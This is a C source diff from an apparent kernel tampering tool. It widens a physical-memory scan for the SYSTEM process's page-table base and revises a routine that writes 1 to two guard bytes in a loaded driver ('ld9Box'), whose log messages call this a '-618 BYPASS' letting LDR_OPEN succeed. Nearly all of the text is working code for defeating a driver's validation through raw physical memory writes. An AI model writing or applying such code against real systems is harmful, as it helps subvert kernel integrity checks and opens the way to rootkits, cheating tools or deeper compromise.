@@ -710,10 +710,22 @@ UINT64 TS_GetSystemCr3(PTS_CTX ctx) {
     DbgLog("TS_GetSystemCr3: Scanning physical memory for SYSTEM EPROCESS...");
 
     // Common physical addresses where SYSTEM EPROCESS is found
+    // Expanded range to cover more common locations across different systems
     static const UINT64 commonAddresses[] = {
-        0x1a2000, 0x1a3000, 0x1a4000, 0x1a5000, 0x1a6000,
-        0x1a7000, 0x1a8000, 0x1a9000, 0x1aa000, 0x1ab000,
-        0x1ac000, 0x1ad000, 0x1ae000, 0x1af000, 0x1b0000,
+        // Low range (64KB-128KB) - some systems
+        0x10000, 0x11000, 0x12000, 0x13000, 0x14000, 0x15000, 0x16000, 0x17000,
+        0x18000, 0x19000, 0x1a000, 0x1b000, 0x1c000, 0x1d000, 0x1e000, 0x1f000,
+        0x20000,
+        // Mid-low range (1MB-2MB) - common on many systems
+        0x100000, 0x110000, 0x120000, 0x130000, 0x140000, 0x150000, 0x160000,
+        0x170000, 0x180000, 0x190000, 0x1a0000, 0x1b0000, 0x1c0000, 0x1d0000,
+        0x1e0000, 0x1f0000, 0x200000,
+        // Original range (1.6MB-1.7MB) - most common observed
+        0x1a2000, 0x1a3000, 0x1a4000, 0x1a5000, 0x1a6000, 0x1a7000, 0x1a8000,
+        0x1a9000, 0x1aa000, 0x1ab000, 0x1ac000, 0x1ad000, 0x1ae000, 0x1af000,
+        0x1b0000, 0x1b1000, 0x1b2000, 0x1b3000, 0x1b4000, 0x1b5000, 0x1b6000,
+        0x1b7000, 0x1b8000, 0x1b9000, 0x1ba000, 0x1bb000, 0x1bc000, 0x1bd000,
+        0x1be000, 0x1bf000, 0x1c0000,
     };
 
     // "System" as little-endian bytes
@@ -748,10 +760,10 @@ UINT64 TS_GetSystemCr3(PTS_CTX ctx) {
         }
     }
 
-    DbgLog("TS_GetSystemCr3: Not found at common addresses, scanning 1MB-16MB...");
+    DbgLog("TS_GetSystemCr3: Not found at common addresses, scanning 64KB-32MB...");
 
-    // Scan first 16MB of physical memory
-    for (UINT64 baseAddr = 0x100000; baseAddr < 0x1000000; baseAddr += 0x1000) {
+    // Scan first 32MB of physical memory (64KB start to avoid BIOS/firmware regions)
+    for (UINT64 baseAddr = 0x10000; baseAddr < 0x2000000; baseAddr += 0x1000) {
         UINT64 imageFileName = 0;
         if (!TS_ReadPhys8(ctx, baseAddr + EPROCESS_IMAGE_FILE_NAME, &imageFileName)) {
             continue;
@@ -898,74 +910,84 @@ bool TS_Patch618Flags(PTS_CTX ctx, UINT64 ld9BoxBase) {
     if (!ctx || !ctx->bInitialized) return false;
 
     DbgLog("TS_Patch618Flags: ============================================");
-    DbgLog("TS_Patch618Flags: BYPASSING -618 CHECK");
+    DbgLog("TS_Patch618Flags: BYPASSING -618 CHECK (GUARD FLAG METHOD)");
     DbgLog("TS_Patch618Flags: ============================================");
     DbgLog("TS_Patch618Flags: Target driver base: 0x%016llX", ld9BoxBase);
+    DbgLog("TS_Patch618Flags: ");
+    DbgLog("TS_Patch618Flags: Strategy: Patch GUARD flags to skip parsing block");
+    DbgLog("TS_Patch618Flags: Guard flags control whether module parsing runs.");
+    DbgLog("TS_Patch618Flags: If either guard is non-zero, parsing is skipped");
+    DbgLog("TS_Patch618Flags: and -618 error is never generated.");
+    DbgLog("TS_Patch618Flags: ");
 
-    UINT64 ntoskrnlFlagVA = ld9BoxBase + LD9BOX_NTOSKRNL_FLAG_OFFSET;
-    UINT64 halFlagVA = ld9BoxBase + LD9BOX_HAL_FLAG_OFFSET;
+    // Calculate GUARD flag virtual addresses (NOT result flags!)
+    UINT64 ntoskrnlGuardVA = ld9BoxBase + LD9BOX_NTOSKRNL_GUARD_OFFSET;
+    UINT64 halGuardVA = ld9BoxBase + LD9BOX_HAL_GUARD_OFFSET;
 
-    DbgLog("TS_Patch618Flags: ntoskrnl flag VA: 0x%016llX (base + 0x%llX)",
-           ntoskrnlFlagVA, (UINT64)LD9BOX_NTOSKRNL_FLAG_OFFSET);
-    DbgLog("TS_Patch618Flags: hal flag VA: 0x%016llX (base + 0x%llX)",
-           halFlagVA, (UINT64)LD9BOX_HAL_FLAG_OFFSET);
+    DbgLog("TS_Patch618Flags: ntoskrnl GUARD VA: 0x%016llX (base + 0x%llX)",
+           ntoskrnlGuardVA, (UINT64)LD9BOX_NTOSKRNL_GUARD_OFFSET);
+    DbgLog("TS_Patch618Flags: hal GUARD VA: 0x%016llX (base + 0x%llX)",
+           halGuardVA, (UINT64)LD9BOX_HAL_GUARD_OFFSET);
 
     // Translate VAs to PAs
-    DbgLog("TS_Patch618Flags: Translating ntoskrnl flag VA to PA...");
-    UINT64 ntoskrnlFlagPA = 0;
-    UINT64 halFlagPA = 0;
+    DbgLog("TS_Patch618Flags: Translating ntoskrnl GUARD VA to PA...");
+    UINT64 ntoskrnlGuardPA = 0;
+    UINT64 halGuardPA = 0;
 
-    if (!TS_VirtToPhys(ctx, 0, ntoskrnlFlagVA, &ntoskrnlFlagPA)) {
-        TS_SetError(ctx, "Failed to translate ntoskrnl flag VA 0x%016llX", ntoskrnlFlagVA);
+    if (!TS_VirtToPhys(ctx, 0, ntoskrnlGuardVA, &ntoskrnlGuardPA)) {
+        TS_SetError(ctx, "Failed to translate ntoskrnl guard VA 0x%016llX", ntoskrnlGuardVA);
         return false;
     }
-    DbgLog("TS_Patch618Flags: ntoskrnl flag PA: 0x%016llX", ntoskrnlFlagPA);
+    DbgLog("TS_Patch618Flags: ntoskrnl GUARD PA: 0x%016llX", ntoskrnlGuardPA);
 
-    DbgLog("TS_Patch618Flags: Translating hal flag VA to PA...");
-    if (!TS_VirtToPhys(ctx, 0, halFlagVA, &halFlagPA)) {
-        TS_SetError(ctx, "Failed to translate hal flag VA 0x%016llX", halFlagVA);
+    DbgLog("TS_Patch618Flags: Translating hal GUARD VA to PA...");
+    if (!TS_VirtToPhys(ctx, 0, halGuardVA, &halGuardPA)) {
+        TS_SetError(ctx, "Failed to translate hal guard VA 0x%016llX", halGuardVA);
         return false;
     }
-    DbgLog("TS_Patch618Flags: hal flag PA: 0x%016llX", halFlagPA);
+    DbgLog("TS_Patch618Flags: hal GUARD PA: 0x%016llX", halGuardPA);
 
-    // Read current values for logging
-    UINT8 currentNtoskrnl = 0, currentHal = 0;
-    DbgLog("TS_Patch618Flags: Reading current flag values...");
-    TS_ReadPhys1(ctx, ntoskrnlFlagPA, &currentNtoskrnl);
-    TS_ReadPhys1(ctx, halFlagPA, &currentHal);
-    DbgLog("TS_Patch618Flags: BEFORE: ntoskrnl=%u (0x%02X) hal=%u (0x%02X)",
-           currentNtoskrnl, currentNtoskrnl, currentHal, currentHal);
+    // Read current guard values for logging
+    UINT8 currentNtoskrnlGuard = 0, currentHalGuard = 0;
+    DbgLog("TS_Patch618Flags: Reading current GUARD flag values...");
+    TS_ReadPhys1(ctx, ntoskrnlGuardPA, &currentNtoskrnlGuard);
+    TS_ReadPhys1(ctx, halGuardPA, &currentHalGuard);
+    DbgLog("TS_Patch618Flags: BEFORE: ntoskrnl_guard=%u (0x%02X) hal_guard=%u (0x%02X)",
+           currentNtoskrnlGuard, currentNtoskrnlGuard, currentHalGuard, currentHalGuard);
 
-    // Write 1 to both flags
-    DbgLog("TS_Patch618Flags: Writing 1 to ntoskrnl flag...");
-    if (!TS_WritePhys1(ctx, ntoskrnlFlagPA, 1)) {
-        TS_SetError(ctx, "Failed to write ntoskrnl flag");
+    // Write 1 to BOTH guard flags to ensure parsing is skipped
+    // (The condition is: if ((guard1 == 0) && (guard2 == 0)) then parse)
+    // So setting either to 1 would work, but we set both for safety
+    DbgLog("TS_Patch618Flags: Writing 1 to ntoskrnl GUARD flag...");
+    if (!TS_WritePhys1(ctx, ntoskrnlGuardPA, 1)) {
+        TS_SetError(ctx, "Failed to write ntoskrnl guard flag");
         return false;
     }
 
-    DbgLog("TS_Patch618Flags: Writing 1 to hal flag...");
-    if (!TS_WritePhys1(ctx, halFlagPA, 1)) {
-        TS_SetError(ctx, "Failed to write hal flag");
+    DbgLog("TS_Patch618Flags: Writing 1 to hal GUARD flag...");
+    if (!TS_WritePhys1(ctx, halGuardPA, 1)) {
+        TS_SetError(ctx, "Failed to write hal guard flag");
         return false;
     }
 
     // Verify writes
     DbgLog("TS_Patch618Flags: Verifying writes...");
-    UINT8 verifyNtoskrnl = 0, verifyHal = 0;
-    TS_ReadPhys1(ctx, ntoskrnlFlagPA, &verifyNtoskrnl);
-    TS_ReadPhys1(ctx, halFlagPA, &verifyHal);
+    UINT8 verifyNtoskrnlGuard = 0, verifyHalGuard = 0;
+    TS_ReadPhys1(ctx, ntoskrnlGuardPA, &verifyNtoskrnlGuard);
+    TS_ReadPhys1(ctx, halGuardPA, &verifyHalGuard);
 
-    DbgLog("TS_Patch618Flags: AFTER: ntoskrnl=%u (0x%02X) hal=%u (0x%02X)",
-           verifyNtoskrnl, verifyNtoskrnl, verifyHal, verifyHal);
+    DbgLog("TS_Patch618Flags: AFTER: ntoskrnl_guard=%u (0x%02X) hal_guard=%u (0x%02X)",
+           verifyNtoskrnlGuard, verifyNtoskrnlGuard, verifyHalGuard, verifyHalGuard);
 
-    if (verifyNtoskrnl != 1 || verifyHal != 1) {
-        TS_SetError(ctx, "Flag verification FAILED: ntoskrnl=%u hal=%u (expected 1)",
-                    verifyNtoskrnl, verifyHal);
+    if (verifyNtoskrnlGuard != 1 || verifyHalGuard != 1) {
+        TS_SetError(ctx, "Guard flag verification FAILED: ntoskrnl=%u hal=%u (expected 1)",
+                    verifyNtoskrnlGuard, verifyHalGuard);
         return false;
     }
 
     DbgLog("TS_Patch618Flags: ============================================");
     DbgLog("TS_Patch618Flags: -618 BYPASS SUCCESSFUL!");
+    DbgLog("TS_Patch618Flags: Parsing block will be SKIPPED.");
     DbgLog("TS_Patch618Flags: LDR_OPEN should now work!");
     DbgLog("TS_Patch618Flags: ============================================");
     return true;
